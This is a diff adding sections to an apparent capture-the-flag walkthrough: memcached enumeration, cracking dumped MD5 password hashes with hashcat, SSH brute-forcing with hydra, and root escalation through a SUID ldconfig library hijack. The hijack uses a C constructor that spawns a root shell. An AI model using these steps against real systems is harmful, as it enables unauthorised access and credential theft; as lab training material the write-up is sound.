@@ -105,8 +105,170 @@ And now use it with wfuzz and filter out http code 500:
 
 ![obraz](https://github.com/user-attachments/assets/fa89e066-67ef-4ba0-a10e-33a7afb26ec8)
 
-We have found port 11211, it's used for memcached - "a high-performance, distributed memory object caching system."   
+We have found port 11211.  
+it's used for memcached - "a high-performance, distributed memory object caching system."    
 It's designed to speed up web apps by caching frequently accessed data.  
+
+
+## Memcached - Port 11211  
+
+I had to google a cheatsheet with memcached commands to enumerate it.  
+This article contains everything we would need:  
+```
+https://www.hackingarticles.in/penetration-testing-on-memcached-server/
+```
+We can start with enumerating version:  
+
+![obraz](https://github.com/user-attachments/assets/4ce6b5b3-c9b9-44ba-a6d9-5c897553b8bc)
+
+It worked, now we can look for info about items cached in memory.  
+Notice that we need to login as admin on port 80 to get this info because caching times out.  
+
+![obraz](https://github.com/user-attachments/assets/e420b050-5e5f-49dc-8cf9-076faf669ea2)
+
+We have two active slabs as shown above, slab with ID 16 and slab with ID 26.  
+The first one is nothing important just the contents that are on the website on port 80.  
+Let's check the second slab.  
+
+![obraz](https://github.com/user-attachments/assets/4fe3b265-e4f5-4c5c-a09e-a1d78b962337)
+
+Using stats cachedump, 26 = ID, 0 = keys we want (zero means all keys).  
+We can see that there is ITEM called users, that seems intresting.  
+
+![obraz](https://github.com/user-attachments/assets/52a7ef44-53e9-4709-8326-f51e96e55e19)
+
+It dumped usernames with it's hashes.  
+all we need to do is put them in a file and run hashcat with mode 0 for md5.  
+```
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+After it run we can use --show to see all hashes that successfully cracked.  
+
+![obraz](https://github.com/user-attachments/assets/43aedcc5-7b3f-4faf-bbb9-322c0ec938b9)
+
+We can take hashes, match them with usernames and put it in a file.  
+
+
+![obraz](https://github.com/user-attachments/assets/6cd1043a-38fd-4ec4-b789-4cf7b0049cfd)
+
+Now as we have this file we can try to login with ssh using hydra.  
+
+![obraz](https://github.com/user-attachments/assets/ccf48ca0-a7c5-4013-b50f-e9f5d83e4527)
+
+-C flag is for a file that has usernames and passwords combined.  
+
+
+
+
+## Shell as genevieve
+
+We can now login with ssh:  
+
+![obraz](https://github.com/user-attachments/assets/09cf6974-0074-42b3-a23c-cc2848dce013)
+
+
+
+
+## Priv esc to root
+
+After running linpeas we have found two SUID binaries.  
+
+![obraz](https://github.com/user-attachments/assets/91ac404c-b839-4cfd-8bb8-2b89321c22a3)
+
+/sbin/ldconfig  
+and  
+/usr/bin/myexec  
+
+Let's check myexec first.  
+
+![obraz](https://github.com/user-attachments/assets/0845bec8-a7f4-46fb-9bcf-197e589fdebf)
+
+It just asks for a password.  
+we can use ltrace to check interactions with shared libraries.  
+
+![obraz](https://github.com/user-attachments/assets/06830328-0099-4bbf-8052-a30471d93bb6)
+
+This is a line where this binary compare password specified to the real password:  
+```
+strcmp("s3cur3l0g1n", "test")
+```
+Meaning we now have a correct password "s3cur3l0g1n".  
+
+Now we can check what happens when we use correct password:  
+
+![obraz](https://github.com/user-attachments/assets/b84b4fa8-d1ec-4657-a4ac-eddbf898d77c)
+
+
+
+## Exploiting SUID binary
+
+We have SUID bit set in ldconfig also which is a tool used to link libraries.  
+Let's trace system calls when we run this app by using strace command:   
+
+![obraz](https://github.com/user-attachments/assets/7385950a-a7b4-4345-a3a0-3b32d620f70a)
+
+From the output we notice that it loads custom share library called  /usr/lib/libseclogin.so  
+It could be done with ldd which will also be a more clear way.  
+
+![obraz](https://github.com/user-attachments/assets/23211668-1bec-48ac-93c6-f65ced67d6dc)
+
+ldd prints shared libraries use by a program.  
+
+We have ldconfig with SUID bit set, meaning we can try to hijack a shared library.  
+First we need to create a new shared library.  
+I'll create a new directory first /tmp/hijack.  
+
+Now we can create libseclogin.c there. here is an exemplary code:  
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void pwn() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}
+```
+
+Now we need to compile it:
+
+![obraz](https://github.com/user-attachments/assets/baa27584-8e9f-4f15-80e9-dd7adb6eb729)
+
+We end up with /tmp/hijack/libseclogin.so 
+
+ldconfig uses files in /etc/ld.so.conf.d/ directory to determine which libraries it will load.  
+We can now just simply create new file with our /tmp/hijack path specified.  
+
+![obraz](https://github.com/user-attachments/assets/eab7efc9-11de-4b86-a128-7f994d3bd398)
+
+Now if we run ldconfig it will update a path, it can be verified simply by using ldd again.  
+
+![obraz](https://github.com/user-attachments/assets/c0a93ec9-b4bb-4c50-affb-bf6c40b92c9d)
+
+Now when we run myexec binary it should load our malicious shared library instead and execute it with root privileges (since we have SUID bit set).  
+
+![obraz](https://github.com/user-attachments/assets/9598438b-eb92-426a-8b91-baffaa088128)
+
+It worked, thank you for reading. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
